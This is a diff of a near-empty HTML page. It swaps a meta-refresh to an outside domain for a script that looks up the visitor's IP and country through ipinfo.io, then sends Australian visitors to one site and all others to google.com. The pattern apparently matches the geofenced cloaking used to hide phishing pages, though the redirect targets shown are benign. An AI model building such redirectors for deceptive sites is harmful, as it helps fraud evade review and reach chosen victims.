@@ -1,11 +1,36 @@
 <!DOCTYPE html>
-<html lang="de">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="refresh" content="0;url=https://props.sergolamn.de/meta/">
-    <title>testos...</title>
+    <title>work</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.js" integrity="sha512-cEgdeh0IWe1pUYypx4mYPjDxGB/tyIORwjxzKrnoxcif2ZxI7fw81pZWV0lGnPWLrfIHGA7qc964MnRjyCYmEQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+    <script>
+        // Define the allowed countries (ISO 3166-1 alpha-2 country codes)
+const allowedCountries = ['AU']; // Example: United States, Canada, United Kingdom
+
+$.get('https://ipinfo.io/json', function(data) {  
+    const ipAddress = data.ip;  // Extract the IP address  
+    const country = data.country;  // Extract the country code  
+
+    console.log("IP Address:", ipAddress);  
+    console.log("Country:", country);  
+
+    // Check if the country is in the allowed list  
+    if (allowedCountries.includes(country)) {    
+        console.log("Access allowed for country:", country);    
+        window.location.href = "https://ovh.com"; // رابط للمسموح لهم  
+    } else {    
+        console.log("Access denied for country:", country);    
+        window.location.href = "https://google.com"; // رابط لمنعهم  
+    }
+}).fail(function(error) {  
+    console.error('Error:', error);  
+});
+    </script>
 </head>
 <body>
+
 </body>
 </html>
